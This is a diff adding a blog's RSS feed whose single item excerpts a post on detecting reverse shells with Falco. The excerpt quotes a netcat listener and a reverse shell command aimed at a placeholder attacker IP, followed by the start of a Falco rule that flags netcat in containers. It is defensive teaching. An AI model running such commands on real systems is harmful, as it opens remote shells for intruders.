@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>falco on Xiao.chen</title>
+    <link>https://blog.wisekee.com/tags/falco/</link>
+    <description>Recent content in falco on Xiao.chen</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <copyright>Copyright © 2008–2020, Xiao.chen; all rights reserved.</copyright>
+    <lastBuildDate>Fri, 20 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.wisekee.com/tags/falco/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Falco reverse shell detecting</title>
+      <link>https://blog.wisekee.com/post/falco-reverse-shell-rules/</link>
+      <pubDate>Fri, 20 May 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/falco-reverse-shell-rules/</guid>
+      <description>Reverse shell tries to circumvent these protections by reversing the roles. It is the target machine that initiates the connection request to the user end.
+for example
+Netcat can be used to both set up a shell listener and initiate reverse shell connections from the victim machine. Here’s a quick example to setup a shell listener: 1nc -l -p 1234 On the victim side, the attacker would initiate the interactive shell connection with the following command: 1nc -e /bin/bash &amp;lt;attacker IP&amp;gt; 1234 Detect with Falco 1- rule: Netcat Remote Code Execution in Container 2 desc: Netcat Program runs inside container that allows remote code execution 3 condition: &amp;gt; 4 spawned_process and container and 5 ((proc.</description>
+    </item>
+    
+  </channel>
+</rss>
